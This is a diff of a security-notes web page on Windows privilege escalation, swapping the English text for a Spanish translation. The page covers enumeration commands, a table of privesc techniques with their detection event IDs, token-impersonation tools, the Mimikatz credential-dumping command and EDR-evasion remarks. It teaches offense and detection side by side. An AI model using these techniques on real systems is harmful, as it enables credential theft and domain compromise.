@@ -3,8 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Windows Privilege Escalation - Identidad y Active Directory | ldamoredev Security Atlas</title>
-<meta name="description" content="Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a...">
+<title>Windows Privilege Escalation | ldamoredev Security Atlas</title>
+<meta name="description" content="La escalada de privilegios en Windows es la operación post-foothold de moverse de un contexto de usuario Windows de baja integridad/bajo privilegio a uno más...">
 <meta name="author" content="ldamoredev">
 <meta name="keywords" content="cybersecurity, web security, API security, cloud security, offensive security, DevSecOps, security playbooks, Identidad y Active Directory, Windows Privilege Escalation, identity-and-active-directory, windows, privilege-escalation, post-exploitation">
 <meta name="theme-color" content="#16a34a">
@@ -20,18 +20,18 @@
 <meta property="og:locale" content="es_ES">
 <meta property="og:locale:alternate" content="en_US">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows Privilege Escalation - Identidad y Active Directory | ldamoredev Security Atlas">
-<meta property="og:description" content="Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a...">
+<meta property="og:title" content="Windows Privilege Escalation | ldamoredev Security Atlas">
+<meta property="og:description" content="La escalada de privilegios en Windows es la operación post-foothold de moverse de un contexto de usuario Windows de baja integridad/bajo privilegio a uno más...">
 <meta property="og:url" content="https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html">
 <meta property="og:image" content="https://ldamoredev.github.io/cibersecurity-notes/assets/og-image.png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 <meta property="og:image:alt" content="ldamoredev Security Atlas">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Windows Privilege Escalation - Identidad y Active Directory | ldamoredev Security Atlas">
-<meta name="twitter:description" content="Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a...">
+<meta name="twitter:title" content="Windows Privilege Escalation | ldamoredev Security Atlas">
+<meta name="twitter:description" content="La escalada de privilegios en Windows es la operación post-foothold de moverse de un contexto de usuario Windows de baja integridad/bajo privilegio a uno más...">
 <meta name="twitter:image" content="https://ldamoredev.github.io/cibersecurity-notes/assets/og-image.png">
-<script type="application/ld+json">[{"@context":"https://schema.org","@type":"TechArticle","@id":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html#article","name":"Windows Privilege Escalation - Identidad y Active Directory | ldamoredev Security Atlas","headline":"Windows Privilege Escalation","description":"Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a...","url":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html","inLanguage":"es","datePublished":"2026-05-11","dateModified":"2026-05-11","mainEntityOfPage":{"@type":"WebPage","@id":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html"},"isPartOf":{"@type":"WebSite","@id":"https://ldamoredev.github.io/cibersecurity-notes/#website","name":"ldamoredev Security Atlas","url":"https://ldamoredev.github.io/cibersecurity-notes/"},"author":{"@type":"Person","@id":"https://ldamoredev.github.io/cibersecurity-notes/#author","name":"ldamoredev"},"keywords":["cybersecurity","web security","API security","cloud security","offensive security","DevSecOps","security playbooks","Identidad y Active Directory","Windows Privilege Escalation","identity-and-active-directory","windows","privilege-escalation","post-exploitation"]},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Inicio","item":"https://ldamoredev.github.io/cibersecurity-notes/es/"},{"@type":"ListItem","position":2,"name":"Ciberseguridad","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/index.html"},{"@type":"ListItem","position":3,"name":"Identidad y Active Directory","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/index.html"},{"@type":"ListItem","position":4,"name":"Windows Privilege Escalation","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html"}]}]</script>
+<script type="application/ld+json">[{"@context":"https://schema.org","@type":"TechArticle","@id":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html#article","name":"Windows Privilege Escalation | ldamoredev Security Atlas","headline":"Windows Privilege Escalation","description":"La escalada de privilegios en Windows es la operación post-foothold de moverse de un contexto de usuario Windows de baja integridad/bajo privilegio a uno más...","url":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html","inLanguage":"es","datePublished":"2026-05-11","dateModified":"2026-05-11","mainEntityOfPage":{"@type":"WebPage","@id":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html"},"isPartOf":{"@type":"WebSite","@id":"https://ldamoredev.github.io/cibersecurity-notes/#website","name":"ldamoredev Security Atlas","url":"https://ldamoredev.github.io/cibersecurity-notes/"},"author":{"@type":"Person","@id":"https://ldamoredev.github.io/cibersecurity-notes/#author","name":"ldamoredev"},"keywords":["cybersecurity","web security","API security","cloud security","offensive security","DevSecOps","security playbooks","Identidad y Active Directory","Windows Privilege Escalation","identity-and-active-directory","windows","privilege-escalation","post-exploitation"]},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Inicio","item":"https://ldamoredev.github.io/cibersecurity-notes/es/"},{"@type":"ListItem","position":2,"name":"Ciberseguridad","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/index.html"},{"@type":"ListItem","position":3,"name":"Identidad y Active Directory","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/index.html"},{"@type":"ListItem","position":4,"name":"Windows Privilege Escalation","item":"https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html"}]}]</script>
 <link rel="alternate" hreflang="en" href="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html">
 <link rel="alternate" hreflang="es" href="https://ldamoredev.github.io/cibersecurity-notes/es/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html">
 <link rel="alternate" hreflang="x-default" href="https://ldamoredev.github.io/cibersecurity-notes/en/cybersecurity/identity-and-active-directory/windows-privilege-escalation.html">
@@ -410,296 +410,244 @@
 <div id="search-results" hidden></div>
 <div class="main-row">
 <main class="content">
-<nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../../index.html">Inicio</a><span>/</span><a href="../index.html">Ciberseguridad</a><span>/</span><a href="index.html">Identidad y Active Directory</a><span>/</span><span>Windows Privilege Escalation</span></nav>
+<nav class="breadcrumbs" aria-label="Breadcrumb"><a href="../../index.html">Inicio</a><span>Windows Privilege Escalation</span></nav>
 <header class="page-hero">
 <div class="page-meta"><span class="meta-chip">concept</span><span class="meta-chip accent-red">Identidad y Active Directory</span><span class="meta-chip meta-time" title="Tiempo estimado de lectura">~12 min de lectura</span><span class="meta-chip meta-updated" title="Última actualización">Actualizado May 11, 2026</span><span class="meta-chip tag">#cybersecurity</span><span class="meta-chip tag">#identity-and-active-directory</span><span class="meta-chip tag">#windows</span><span class="meta-chip tag">#privilege-escalation</span><span class="meta-chip tag">#post-exploitation</span></div>
 </header>
 <article class="article-note">
-<div class="translation-pending" role="note">Esta nota todavía no está traducida — se muestra el original en inglés.</div>
 <h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
-<h2 id="definition">Definition</h2>
-<p>Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a standard <code>Users</code> group account to <code>Administrators</code>, <code>SYSTEM</code>, or a Tier 0 identity. Unlike kernel-exploit privesc (which is rare on patched modern Windows), the canonical Windows privesc surface in 2026 is <strong>misconfiguration-driven</strong>: service ACLs, unquoted paths, writable directories on <code>PATH</code>, scheduled tasks, AlwaysInstallElevated, stored credentials, token-privilege abuse, and DLL hijacking. The job is enumeration discipline, not exploit-writing.</p>
-<h2 id="why-it-matters">Why it matters</h2>
-<p>Windows local privilege escalation is the bridge between an initial foothold (phish, password spray, exposed service) and the AD attack surface this branch covers. A standard-user shell on a domain-joined workstation cannot Kerberoast a service account whose ticket needs <code>tgtdeleg</code>, cannot dump LSASS for <a href="pass-the-hash-and-ntlm-credential-reuse.html">Pass-the-Hash</a>, cannot run <a href="bloodhound-attack-path-analysis.html">BloodHound</a> with SharpHound's session collection, and cannot reliably perform <a href="dcsync-and-ntdsdit-extraction.html">DCSync</a> without already having privileged credentials. Local privesc converts the shell into the operating context that the rest of this branch assumes.</p>
-<p>The technique also matters as a teaching note because it surfaces three transferable senior facts about Windows:</p>
+<h2 id="definicion">Definición</h2>
+<p>La escalada de privilegios en Windows es la operación post-foothold de moverse de un contexto de usuario Windows de baja integridad/bajo privilegio a uno más alto — típicamente de una cuenta de grupo <code>Users</code> estándar a <code>Administrators</code>, <code>SYSTEM</code> o una identidad Tier 0. A diferencia de la privesc por exploit de kernel (rara en Windows moderno parcheado), la superficie canónica de privesc en Windows en 2026 está <strong>dirigida por mal configuración</strong>: ACLs de servicios, rutas sin comillas, directorios escribibles en <code>PATH</code>, scheduled tasks, AlwaysInstallElevated, credenciales almacenadas, abuso de privilegios de token y DLL hijacking. El trabajo es disciplina de enumeración, no escritura de exploits.</p>
+<h2 id="por-que-importa">Por qué importa</h2>
+<p>La escalada de privilegios local en Windows es el puente entre un foothold inicial (phish, password spray, servicio expuesto) y la superficie de ataque AD que esta rama cubre. Una shell de usuario estándar en una workstation unida al dominio no puede Kerberoastear una service account cuyo ticket necesita <code>tgtdeleg</code>, no puede dumpear LSASS para <a href="pass-the-hash-and-ntlm-credential-reuse.html">Pass-the-Hash</a>, no puede ejecutar <a href="bloodhound-attack-path-analysis.html">BloodHound</a> con la colección de sesiones de SharpHound, y no puede realizar <a href="dcsync-and-ntdsdit-extraction.html">DCSync</a> de forma confiable sin ya tener credenciales privilegiadas. La privesc local convierte la shell en el contexto operativo que el resto de esta rama asume.</p>
+<p>La técnica también importa como nota de aprendizaje porque expone tres hechos senior transferibles sobre Windows:</p>
 <ul>
-<li><strong>Default Windows is full of historical misconfigurations.</strong> Services installed by third-party software in 2015 with weak ACLs are still on production boxes in 2026. Privesc enumeration is largely <em>finding accumulated configuration debt</em>, not finding new vulnerabilities.</li>
-<li><strong><code>SYSTEM</code> is not the goal. The right identity is.</strong> Modern Windows offense aims at <em>the identity that lets you do the next thing</em>: the local admin that runs a service account, the user that has <code>SeBackupPrivilege</code>, the account that owns a scheduled task with stored credentials. Blindly chasing <code>NT AUTHORITY\SYSTEM</code> misses higher-leverage paths.</li>
-<li><strong>Privesc and detection move on the same Event IDs.</strong> Every privesc primitive that succeeds generates a recognizable signal in Windows Event Logs — 4624 with <code>LogonType=2</code>/<code>5</code>/<code>10</code>, 4672 (special privileges assigned), 4688 with a suspicious parent process, 4697 (service installation), 4698 (scheduled task creation). Senior operators know which primitives produce which telemetry; senior defenders write detection rules for the same primitives.</li>
+<li><strong>Windows por defecto está lleno de malas configuraciones históricas.</strong> Los servicios instalados por software de terceros en 2015 con ACLs débiles todavía están en cajas de producción en 2026. La enumeración de privesc es principalmente <em>encontrar deuda de configuración acumulada</em>, no encontrar nuevas vulnerabilidades.</li>
+<li><strong><code>SYSTEM</code> no es el objetivo. La identidad correcta sí lo es.</strong> La ofensiva moderna de Windows apunta a <em>la identidad que te permite hacer lo siguiente</em>: el admin local que ejecuta una service account, el usuario que tiene <code>SeBackupPrivilege</code>, la cuenta que es propietaria de un scheduled task con credenciales almacenadas.</li>
+<li><strong>La privesc y la detección se mueven sobre los mismos Event IDs.</strong> Cada primitiva de privesc que tiene éxito genera una señal reconocible en Windows Event Logs — 4624 con <code>LogonType=2</code>/<code>5</code>/<code>10</code>, 4672 (privilegios especiales asignados), 4688 con un proceso padre sospechoso, 4697 (instalación de servicio), 4698 (creación de scheduled task).</li>
 </ul>
-<h2 id="how-it-works">How it works</h2>
-<p>Windows local privesc reduces to a <strong>3-step loop</strong> repeated across multiple primitive classes:</p>
+<h2 id="como-funciona">Cómo funciona</h2>
+<p>La privesc local en Windows se reduce a un <strong>loop de 3 pasos</strong> repetido en múltiples clases de primitivas:</p>
 <ol>
-<li><strong>Enumerate.</strong> Inventory services, scheduled tasks, autoruns, file ACLs on system directories, registry ACLs on service-control keys, stored credentials in Credential Manager / <code>cmdkey</code>, current user privileges (<code>whoami /priv</code>), members of local privileged groups, AlwaysInstallElevated registry state, unquoted service paths, writable directories on <code>PATH</code>. The enumeration is mechanical and exhaustive — tools (winPEAS, PowerUp, Seatbelt) automate it but do not interpret it.</li>
-<li><strong>Identify a high-leverage primitive.</strong> Match the enumeration output against the canonical privesc-class list (below). Most boxes have multiple findable primitives; the senior move is picking the quietest one that yields the identity you need.</li>
-<li><strong>Exploit and pivot.</strong> Use the chosen primitive to either: gain local administrator rights, gain a different user's session (token impersonation), or recover credentials that authenticate elsewhere. The result frequently chains directly into AD attacks (<a href="kerberoasting.html">Kerberoasting</a>, <a href="pass-the-hash-and-ntlm-credential-reuse.html">Pass-the-Hash</a>, <a href="bloodhound-attack-path-analysis.html">BloodHound</a> with privileged collection).</li>
+<li><strong>Enumerar.</strong> Inventariar servicios, scheduled tasks, autoruns, ACLs de archivo en directorios del sistema, ACLs de registro en claves de control de servicios, credenciales almacenadas en Credential Manager / <code>cmdkey</code>, privilegios del usuario actual (<code>whoami /priv</code>), miembros de grupos privilegiados locales, estado del registro AlwaysInstallElevated, rutas de servicio sin comillas, directorios escribibles en <code>PATH</code>.</li>
+<li><strong>Identificar una primitiva de alto leverage.</strong> Hacer coincidir la salida de enumeración contra la lista canónica de clases de privesc (abajo). La mayoría de las cajas tienen múltiples primitivas encontrables; el movimiento senior es elegir la más silenciosa que produzca la identidad que necesitás.</li>
+<li><strong>Explotar y pivotar.</strong> Usar la primitiva elegida para: ganar derechos de administrador local, ganar la sesión de un usuario diferente (impersonación de token), o recuperar credenciales que autentican en otro lugar.</li>
 </ol>
-<p>A representative enumeration kick-off from a low-priv shell:</p>
-<div class="codehilite"><pre><span></span><code><span class="c"># Run the canonical enumeration suite.</span>
-<span class="p">.\</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="p">&gt;</span> <span class="n">peas</span><span class="p">.</span><span class="n">txt</span>
-<span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">-group</span><span class="p">=</span><span class="n">user</span> <span class="n">-outputfile</span><span class="p">=</span><span class="n">seatbelt</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
-<span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
+<p>Un arranque de enumeración representativo desde una shell de bajo privilegio:</p>
+<div class="codehilite"><pre><span></span><code># Ejecutar la suite de enumeración canónica.
+.\winPEASx64.exe quiet &gt; peas.txt
+.\Seatbelt.exe -group=user -outputfile=seatbelt.txt
+whoami /all
+net localgroup Administrators
 </code></pre></div>
-
-<p>The bug is not "Windows has too many privileges"; it is <em>Windows offers many narrow privilege primitives, and historical software installations frequently leave one or more of them in a configuration that yields escalation to anyone who finds it</em>.</p>
-<h2 id="techniques-patterns">Techniques / patterns</h2>
-<h3 id="the-privesc-primitive-landscape">The privesc-primitive landscape</h3>
-<p>The canonical Windows privesc classes — what enumeration tools surface and what operators look for:</p>
+<h2 id="tecnicas-patrones">Técnicas / patrones</h2>
+<h3 id="el-panorama-de-primitivas-de-privesc">El panorama de primitivas de privesc</h3>
+<p>Las clases canónicas de privesc de Windows — lo que las herramientas de enumeración exponen y lo que los operadores buscan:</p>
 <table>
 <thead>
 <tr>
 <th>#</th>
-<th>Class</th>
-<th>Mechanism</th>
-<th>Telemetry signal</th>
+<th>Clase</th>
+<th>Mecanismo</th>
+<th>Señal de telemetría</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>1</td>
-<td><strong>Weak service permissions</strong></td>
-<td>A service whose binary or registry config is writable by the current user. Replace the binary or change <code>ImagePath</code>, restart, gain <code>SYSTEM</code>.</td>
-<td>Event 4697 (service installed), 4688 (suspicious parent)</td>
+<td><strong>Permisos de servicio débiles</strong></td>
+<td>Un servicio cuyo binario o config de registro es escribible por el usuario actual. Reemplazar el binario o cambiar <code>ImagePath</code>, reiniciar, ganar <code>SYSTEM</code>.</td>
+<td>Event 4697 (servicio instalado), 4688 (padre sospechoso)</td>
 </tr>
 <tr>
 <td>2</td>
-<td><strong>Unquoted service path</strong></td>
-<td>A service <code>ImagePath</code> like <code>C:\Program Files\My App\bin\service.exe</code> with no quotes. If a writable directory exists along the path (<code>C:\Program.exe</code>, <code>C:\Program Files\My.exe</code>), Windows can execute the attacker-placed binary.</td>
+<td><strong>Ruta de servicio sin comillas</strong></td>
+<td>Un servicio <code>ImagePath</code> como <code>C:\Program Files\My App\bin\service.exe</code> sin comillas. Si existe un directorio escribible a lo largo de la ruta, Windows puede ejecutar el binario colocado por el atacante.</td>
 <td>Event 7045, 4688</td>
 </tr>
 <tr>
 <td>3</td>
 <td><strong>DLL hijacking</strong></td>
-<td>A service or scheduled task loads a DLL by name without a fully-qualified path; current user can drop a malicious DLL in a directory earlier in the search order.</td>
-<td>Event 4688, Sysmon Event 7 (image loaded)</td>
+<td>Un servicio o scheduled task carga una DLL por nombre sin una ruta completamente calificada; el usuario actual puede depositar una DLL maliciosa en un directorio anterior en el orden de búsqueda.</td>
+<td>Event 4688, Sysmon Event 7 (imagen cargada)</td>
 </tr>
 <tr>
 <td>4</td>
 <td><strong>AlwaysInstallElevated</strong></td>
-<td><code>HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code> and the <code>HKCU</code> equivalent both set to <code>1</code>. Any user can install an MSI as <code>SYSTEM</code>.</td>
-<td>Event 1033 (MSI installed) + 4624 LogonType=5 (service)</td>
+<td>Ambas claves de registro <code>HKLM</code> y <code>HKCU</code> configuradas a <code>1</code>. Cualquier usuario puede instalar un MSI como <code>SYSTEM</code>.</td>
+<td>Event 1033 (MSI instalado) + 4624 LogonType=5</td>
 </tr>
 <tr>
 <td>5</td>
-<td><strong>Token impersonation / <code>SeImpersonatePrivilege</code></strong></td>
-<td>Service accounts (IIS app pools, SQL Server, etc.) often have <code>SeImpersonatePrivilege</code>. Tools like <em>PrintSpoofer</em>, <em>RoguePotato</em>, <em>GodPotato</em>, <em>EfsPotato</em> trigger a coerced authentication, capture the token, impersonate <code>SYSTEM</code>. Single most-common "service-account → SYSTEM" path.</td>
-<td>Event 4673 (sensitive privilege used), 4624 LogonType=9</td>
+<td><strong>Impersonación de token / <code>SeImpersonatePrivilege</code></strong></td>
+<td>Las service accounts (app pools IIS, SQL Server, etc.) frecuentemente tienen <code>SeImpersonatePrivilege</code>. Herramientas como <em>PrintSpoofer</em>, <em>RoguePotato</em>, <em>GodPotato</em>, <em>EfsPotato</em> desencadenan una autenticación forzada, capturan el token, impersonan <code>SYSTEM</code>.</td>
+<td>Event 4673 (privilegio sensible usado), 4624 LogonType=9</td>
 </tr>
 <tr>
 <td>6</td>
-<td><strong>Stored credentials</strong></td>
-<td>Passwords in: Credential Manager (<code>cmdkey /list</code>), Group Policy Preferences <code>cpassword</code> (legacy), unattended-install files (<code>Unattend.xml</code>, <code>sysprep.inf</code>), registry keys for AutoLogon, browser-cached creds, scripts on disk. Recovering any one of these often yields onward identities.</td>
-<td>Event 4663 (file access) if the auditor enabled it</td>
+<td><strong>Credenciales almacenadas</strong></td>
+<td>Contraseñas en: Credential Manager (<code>cmdkey /list</code>), Group Policy Preferences <code>cpassword</code> (legacy), archivos de instalación desatendida (<code>Unattend.xml</code>, <code>sysprep.inf</code>), claves de registro para AutoLogon.</td>
+<td>Event 4663 (acceso a archivo) si el auditor lo habilitó</td>
 </tr>
 <tr>
 <td>7</td>
 <td><strong>Scheduled tasks</strong></td>
-<td>A task running as a different user with weak permissions: the operator modifies the task's command line, the task runs as that user.</td>
-<td>Event 4698 (task created), 4702 (task updated), 4688 (task execution)</td>
+<td>Un task corriendo como un usuario diferente con permisos débiles: el operador modifica la línea de comando del task, el task corre como ese usuario.</td>
+<td>Event 4698 (task creado), 4702 (task actualizado), 4688 (ejecución del task)</td>
 </tr>
 <tr>
 <td>8</td>
-<td><strong>Writable <code>PATH</code> directories</strong></td>
-<td>A directory early on the system <code>PATH</code> that the current user can write to. Drop a binary with a common name (<code>mspaint.exe</code>, <code>notepad.exe</code>); the next administrator command shadows the real binary.</td>
-<td>Event 4688 with unexpected parent process</td>
+<td><strong>Directorios <code>PATH</code> escribibles</strong></td>
+<td>Un directorio temprano en el <code>PATH</code> del sistema que el usuario actual puede escribir. Depositar un binario con un nombre común; el próximo comando del administrador sombrea el binario real.</td>
+<td>Event 4688 con proceso padre inesperado</td>
 </tr>
 <tr>
 <td>9</td>
-<td><strong>UAC bypass</strong></td>
-<td>When the current user is in <code>Administrators</code> but running with split-token (UAC restricted). Various bypass primitives exist (fodhelper, computerdefaults, sdclt) using auto-elevated binaries with hijackable registry keys. Patched and re-discovered cyclically.</td>
-<td>Event 4688 with auto-elevated parent</td>
+<td><strong>Bypass de UAC</strong></td>
+<td>Cuando el usuario actual está en <code>Administrators</code> pero corre con token dividido (UAC restringido). Varias primitivas de bypass existen (fodhelper, computerdefaults, sdclt).</td>
+<td>Event 4688 con padre auto-elevado</td>
 </tr>
 <tr>
 <td>10</td>
-<td><strong>Kernel exploit</strong></td>
-<td>Patched Windows kernels are usually unexploitable; legacy / unpatched boxes still have viable kernel exploits (Print Nightmare, CVE-2021-1675/34527; HiveNightmare CVE-2021-36934). Rare on production but real.</td>
-<td>Event 4624 LogonType=2, then anomalous behavior</td>
+<td><strong>Exploit de kernel</strong></td>
+<td>Los kernels Windows parcheados usualmente son inexplotables; las cajas legacy / sin parches todavía tienen exploits de kernel viables (Print Nightmare, HiveNightmare). Raro en producción pero real.</td>
+<td>Event 4624 LogonType=2, luego comportamiento anómalo</td>
 </tr>
 </tbody>
 </table>
-<h3 id="patterns">Patterns</h3>
+<h3 id="patrones">Patrones</h3>
 <ul>
-<li><strong><code>whoami /priv</code> is the highest-signal one-liner.</strong> If the output includes <code>SeImpersonatePrivilege</code>, <code>SeAssignPrimaryTokenPrivilege</code>, <code>SeBackupPrivilege</code>, or <code>SeRestorePrivilege</code>, the privesc path is usually 1 step. Most service-account contexts have at least one of these.</li>
-<li><strong>Service-account contexts are easier than user contexts.</strong> Compromising an IIS app pool or SQL Server service account is frequently a faster path to <code>SYSTEM</code> than escalating from a workstation user — <code>SeImpersonatePrivilege</code> is the gift that keeps giving.</li>
-<li><strong>Enumerate, don't exploit-first.</strong> New operators run a kernel exploit because it's interesting. Senior operators run <code>winPEAS</code> → grep for the four canonical findings (writable services, unquoted paths, stored creds, AlwaysInstallElevated) → exploit the quietest match.</li>
-<li><strong>AppLocker / WDAC change the game.</strong> On hardened endpoints, application allowlisting blocks dropped binaries entirely. Operators shift to PowerShell-based primitives, signed-binary abuse (LOLBAS — <code>regsvr32</code>, <code>mshta</code>, <code>rundll32</code>), or in-memory exploitation. Enumeration must explicitly probe the allowlist policy.</li>
-<li><strong>Local Admin is rarely the real goal.</strong> The real goal is usually one of: cached domain credentials in LSASS for <a href="pass-the-hash-and-ntlm-credential-reuse.html">PtH</a>, a service account ticket for <a href="kerberoasting.html">Kerberoasting</a> depth, a configured-stored Kerberos ticket, or local admin on a server that hosts a privileged service. Plan the chain before exploiting the primitive.</li>
-<li><strong>OPSEC: Sysmon and EDR see the canonical primitives.</strong> Most named privesc tools (winPEAS, PowerUp, the Potato family, fodhelper bypass) are detected by default EDR signatures. Senior operators either patch their tooling, live-off-the-land (LOLBin enumeration), or accept the OPSEC cost.</li>
+<li><strong><code>whoami /priv</code> es el one-liner de mayor señal.</strong> Si la salida incluye <code>SeImpersonatePrivilege</code>, <code>SeAssignPrimaryTokenPrivilege</code>, <code>SeBackupPrivilege</code> o <code>SeRestorePrivilege</code>, la ruta de privesc usualmente tiene 1 paso.</li>
+<li><strong>Los contextos de service account son más fáciles que los contextos de usuario.</strong> Comprometer un app pool de IIS o una service account de SQL Server es frecuentemente una ruta más rápida hacia <code>SYSTEM</code> que escalar desde un usuario de workstation — <code>SeImpersonatePrivilege</code> es el regalo que sigue dado.</li>
+<li><strong>Enumerar, no explotar primero.</strong> Los operadores nuevos ejecutan un exploit de kernel porque es interesante. Los operadores senior ejecutan <code>winPEAS</code> → grep para los cuatro hallazgos canónicos (servicios escribibles, rutas sin comillas, credenciales almacenadas, AlwaysInstallElevated) → explotar el match más silencioso.</li>
+<li><strong>AppLocker / WDAC cambian el juego.</strong> En endpoints endurecidos, el allowlisting de aplicaciones bloquea binarios soltados completamente. Los operadores cambian a primitivas basadas en PowerShell, abuso de binarios firmados (LOLBAS), o explotación en memoria.</li>
+<li><strong>Admin local raramente es el objetivo real.</strong> El objetivo real es usualmente uno de: credenciales de dominio cacheadas en LSASS para <a href="pass-the-hash-and-ntlm-credential-reuse.html">PtH</a>, un ticket de service account para profundidad de <a href="kerberoasting.html">Kerberoasting</a>, o admin local en un servidor que aloja un servicio privilegiado.</li>
+<li><strong>OPSEC: Sysmon y EDR ven las primitivas canónicas.</strong> La mayoría de las herramientas de privesc nombradas (winPEAS, PowerUp, la familia Potato, bypass fodhelper) son detectadas por firmas EDR predeterminadas.</li>
 </ul>
-<h2 id="variants-and-bypasses">Variants and bypasses</h2>
-<p>Windows privesc operations split by <strong>4 attack-surface categories</strong> worth distinguishing.</p>
-<h3 id="1-service-control-file-permission-primitives">1. Service-control / file-permission primitives</h3>
-<p>The bulk of real-world privesc — weak service ACLs, unquoted paths, writable directories, DLL hijacking. Discoverable by enumeration, fixable by configuration. Defender response: audit and remediate; no patches required.</p>
-<h3 id="2-token-privilege-primitives">2. Token-privilege primitives</h3>
-<p><code>SeImpersonatePrivilege</code>, <code>SeAssignPrimaryToken</code>, <code>SeBackupPrivilege</code>, <code>SeDebugPrivilege</code>. These exist for legitimate service operation; they become privesc when granted to a context the attacker controls. Defender response: minimize which accounts have these privileges; alert on their use by non-baseline accounts.</p>
-<h3 id="3-credential-recovery-primitives">3. Credential-recovery primitives</h3>
-<p>LSASS dumping (Mimikatz <code>sekurlsa::logonpasswords</code>), DPAPI vault extraction, browser credential stores, GPP <code>cpassword</code>, AutoLogon registry, plaintext in scripts. The recovered credentials drive subsequent AD attacks. Defender response: <a href="pass-the-hash-and-ntlm-credential-reuse.html">Credential Guard</a> for LSASS, LAPS for local admin password reuse, scripted-credential audits.</p>
-<h3 id="4-kernel-uac-bypass-primitives">4. Kernel / UAC bypass primitives</h3>
-<p>Kernel exploits (rare on patched systems but always reappearing), UAC bypasses (frequently re-disclosed via auto-elevated binaries with hijackable references). Defender response: patch promptly, raise UAC slider, prefer JEA (Just-Enough-Administration) over admin accounts.</p>
-<h2 id="impact">Impact</h2>
-<p>Ordered by typical real-world severity:</p>
+<h2 id="variantes-y-bypasses">Variantes y bypasses</h2>
+<p>Las operaciones de privesc de Windows se dividen por <strong>4 categorías de superficie de ataque</strong>.</p>
+<h3 id="1-primitivas-de-control-de-servicio-permisos-de-archivo">1. Primitivas de control de servicio / permisos de archivo</h3>
+<p>La mayor parte de la privesc del mundo real — ACLs de servicio débiles, rutas sin comillas, directorios escribibles, DLL hijacking. Descubribles por enumeración, corregibles por configuración.</p>
+<h3 id="2-primitivas-de-privilegio-de-token">2. Primitivas de privilegio de token</h3>
+<p><code>SeImpersonatePrivilege</code>, <code>SeAssignPrimaryToken</code>, <code>SeBackupPrivilege</code>, <code>SeDebugPrivilege</code>. Existen para operación legítima del servicio; se convierten en privesc cuando se otorgan a un contexto que el atacante controla.</p>
+<h3 id="3-primitivas-de-recuperacion-de-credenciales">3. Primitivas de recuperación de credenciales</h3>
+<p>Dump de LSASS (Mimikatz <code>sekurlsa::logonpasswords</code>), extracción de bóveda DPAPI, stores de credenciales del navegador, GPP <code>cpassword</code>, registro AutoLogon, texto plano en scripts. Las credenciales recuperadas impulsan ataques AD posteriores.</p>
+<h3 id="4-primitivas-de-kernel-bypass-de-uac">4. Primitivas de kernel / bypass de UAC</h3>
+<p>Exploits de kernel (raros en sistemas parcheados pero siempre reapareciendo), bypasses de UAC (frecuentemente re-divulgados vía binarios auto-elevados con referencias hijackables).</p>
+<h2 id="impacto">Impacto</h2>
+<p>Ordenado por severidad real típica:</p>
 <ul>
-<li><strong>Local admin / <code>SYSTEM</code> on a workstation.</strong> Direct outcome of most primitives. Enables LSASS dumping, scheduled-task persistence, registry tampering, EDR evasion attempts.</li>
-<li><strong>Cached credential extraction → AD lateral movement.</strong> <code>SYSTEM</code> on a workstation that has had a domain admin log in = the domain admin's credentials in LSASS. This is <em>the</em> canonical chain from a user workstation to domain compromise. See <a href="tier-zero-administration-and-paw.html">Tier 0 Administration</a> for the structural break of this chain.</li>
-<li><strong>Service-account context → SQL or app-tier compromise.</strong> Privesc on an application server (IIS, SQL Server, Exchange) yields service-account context that frequently has linked-server or trust-relationship access to other Tier 1 hosts.</li>
-<li><strong>Persistence and stealth.</strong> Local admin enables service installation, scheduled tasks, registry-run persistence, and (with <code>SYSTEM</code>) tampering with telemetry/EDR agents.</li>
-<li><strong>Stepping stone to AD attacks.</strong> The reason this note lives in the AD branch: nearly every Windows privesc finding's <em>next step</em> is a Kerberos- or NTLM-based AD attack.</li>
